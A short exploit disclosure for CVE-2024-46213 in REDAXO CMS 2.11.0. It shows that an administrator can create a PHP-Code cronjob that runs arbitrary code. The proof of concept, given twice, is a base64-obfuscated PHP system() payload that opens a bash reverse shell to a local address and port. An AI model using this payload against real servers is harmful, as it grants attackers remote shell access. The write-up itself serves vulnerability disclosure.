# REDAXO Cronjobs AddOns RCE

## Basic Info

- **Exploit Title:** REDAXO Cronjobs AddOns RCE
- **Exploit Author:** L7dia
- **Vendor Homepage:** https://redaxo.org/
- **Software Link:** https://github.com/redaxo/redaxo
- **Version:** 2.11.0
- **Tested on:** Ubuntu20.04/PHP8.2
- **Payload:** `<?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx|base64 -d|bash -i')?>`
- **CVE:** CVE-2024-46213

## Description

REDAXO CMS allows attackers to execution evil php code in Cronjobs Addon. Attackers can set any php code without verified as cronjob to achieve their evil purpose, even get shell.

## Proof of Concept

1. Log in as an administrator
2. Navigate to the AddOns-Cronjobs page(If not present, can install it by Main menu-AddOns)
3. Create a new cronjob, set "Type" to "PHP-Code", and set "PHP-Code" to evil PHP code, such as remote code execution.
4. (Optional) Set "Environment" to "Backend", can execute cronjobs mannually.
5. Save the cronjob, wait for automatic execution or execute it mannually. And then attackers can get shell or achieve other evil purpose.

![image-20240827112702567](https://l7dia-images.oss-cn-hangzhou.aliyuncs.com/images/202410161750587.png)

![image-20240827112715931](https://l7dia-images.oss-cn-hangzhou.aliyuncs.com/images/202410161750519.png)

```
http://127.0.0.1/redaxo/redaxo/index.php?page=cronjob/cronjobs&func=add&list=cronjobs
```

![image-20240827112917694](https://l7dia-images.oss-cn-hangzhou.aliyuncs.com/images/202410161750567.png)

```
<?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx|base64 -d|bash -i')?>
```

![image-20240827112938919](https://l7dia-images.oss-cn-hangzhou.aliyuncs.com/images/202410161750553.png)

![image-20240827113004575](https://l7dia-images.oss-cn-hangzhou.aliyuncs.com/images/202410161750486.png)



